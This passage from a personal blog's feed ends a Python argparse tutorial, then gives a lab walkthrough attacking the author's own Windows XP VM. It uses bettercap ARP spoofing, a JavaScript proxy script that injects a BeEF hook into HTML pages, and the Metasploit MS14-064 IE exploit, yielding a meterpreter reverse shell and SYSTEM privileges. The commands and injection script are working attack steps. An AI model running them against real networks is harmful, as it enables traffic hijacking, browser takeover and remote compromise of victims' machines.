</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;                                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">By WeepingDogel
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">GetParser</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span><span class="s1">&#39;--read&#39;</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s1">&#39;read a file&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parser</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Write</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s1">&#39; has been written&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Read</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">GetParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">Write</span><span class="p">(</span><span class="n">Read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">read</span><span class="p">),</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>好的不难看出，我们得到的东西会到这个 <code>args</code> 变量里面去，<strong>因为它是由 <code>parser.parse_args()</code> 这个函数所返回的内容所赋值而来的，而取出对应选项参数得到的内容则是 <code>args.选项名</code></strong></p>
<p>比如我们要获取写出的文件名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ vim b.py
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Help&#39;</span><span class="p">,</span> <span class="n">epilog</span><span class="o">=</span><span class="s1">&#39;A new testing program.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-o&#39;</span><span class="p">,</span><span class="s1">&#39;--output&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Output file&#39;</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="s1">&#39;test.txt&#39;</span> <span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">output</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The filename is &#34;</span><span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ python b.py -o WeepingDogel
</span></span><span class="line"><span class="cl">The filename is WeepingDogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见我们已经获取到这个字符串 &ldquo;WeepingDogel&rdquo; 了。</p>
<p>同理，需要读取的文件名也是一样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">args</span><span class="o">.</span><span class="n">read</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这么写就可以了～</p>
<p>接下来用截图来看看上面那一堆代码的效果：
</p>
<p>简单的创建与使用就是如此&hellip;</p>
<p>当然还有更多的用法需要探索..</p>
<h1 id="结语">结语</h1>
<p>那么我接下来要做的就是将这些更新进 <a href="https://github.com/WeepingDogel/TitleGetter" target="_blank" rel="noopener noreffer">TitleGetter</a> 啦！</p>
<p>以后就不需要在配置文件里设置 <code>list.txt</code> 的位置了！ 输出的文件位置也不需要固定了！！</p>
<hr>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><a href="https://vra.github.io/2017/12/02/argparse-usage/" target="_blank" rel="noopener noreffer">argparse简要用法总结 | Yunfeng&rsquo;s Simple Blog</a></li>
<li><a href="https://docs.python.org/3/library/argparse.html" target="_blank" rel="noopener noreffer">argparse â Parser for command-line options, arguments and sub-commands — Python 3.9.5 documentation</a></li>
</ul>
]]></description>
</item><item>
    <title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
            </div><h2 id="序">序</h2>
<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
<p>不多说啦，我们开始～</p>
<h3 id="测试环境">测试环境</h3>
<p>啊咧，先说说测试环境。</p>
<ul>
<li>
<p>攻击机</p>
<ul>
<li>Arch Linux</li>
<li>192.168.101.15</li>
</ul>
</li>
<li>
<p>靶机</p>
<ul>
<li>Windows XP on VirtualBox</li>
<li>192.168.101.43</li>
</ul>
</li>
</ul>
<p>条件有限，就只能用 XP 啦～</p>
<h3 id="用到的工具">用到的工具</h3>
<ol>
<li>bettercap
<ul>
<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
</ul>
</li>
<li>beef
<ul>
<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
</ul>
</li>
<li>msf
<ul>
<li>这个就是老朋友啦～</li>
</ul>
</li>
</ol>
<p>什么? nmap? 这次用不着哦～</p>
<h2 id="测试过程">测试过程</h2>
<p>首先是打开 <code>bettercap</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们会看到这样的返回结果..</p>
<p></p>
<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
<p></p>
<p>然后设置 arp 欺骗的目标：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到返回：</p>
<p></p>
<p>那么来说说终端里显示的这几个链接</p>
<ul>
<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
<ul>
<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
<li>一会儿我们要把它写进一个攻击脚本里～</li>
</ul>
</li>
<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
<ul>
<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
</li>
</ul>
</li>
</ul>
<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
<p>改成这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;随便起个名字&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;随便想个密码&#34;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
<p>好了，话不多说，我们继续。</p>
<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
</span></span></code></pre></td></tr></table>
</div>
</div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
<p></p>
<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
<p></p>
<p></p>
<p>然后我们能做的事情就很多了</p>
<p></p>
<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>启用模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">use exploit/windows/browser/ms14_064_ole_code_execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>看看模块的描述</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">info 
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Description:</p>
<p>This module exploits the Windows OLE Automation array vulnerability,
CVE-2014-6332. The vulnerability is known to affect Internet
Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
and no patch for Windows XP. However, this exploit will only target
Windows XP and Windows 7 box due to the Powershell limitation.
Windows XP by defaults supports VBS, therefore it is used as the
attack vector. On other newer Windows systems, the exploit will try
using Powershell instead.</p>
</blockquote>
<p>机翻一下就是：</p>
<blockquote>
<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
</blockquote>
<p>看看设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   0   Windows XP
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
<p><code>SRVHOST</code> 设置为攻击机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们得到了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
</span></span><span class="line"><span class="cl">[*] Server started.
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
<p></p>
<p>然后点击 <code>Execute</code></p>
<p>这时，靶机就会发生一件有趣的事情</p>
<p></p>
<p>无论点击哪个，都会跳转到 msf 的链接。</p>
<p>点击之后，msf 有了反应</p>
<p></p>
<p>一个 <code>meterpreter</code> 连接建立了</p>
<p></p>
<p>进入这个会话</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
<p></p>
<p><code>getsystem</code> 提权也没有问题。</p>
<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
<h2 id="结尾">结尾</h2>
<p>呼~ 写完了.. qwq</p>
<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener noreffer">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
<hr>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
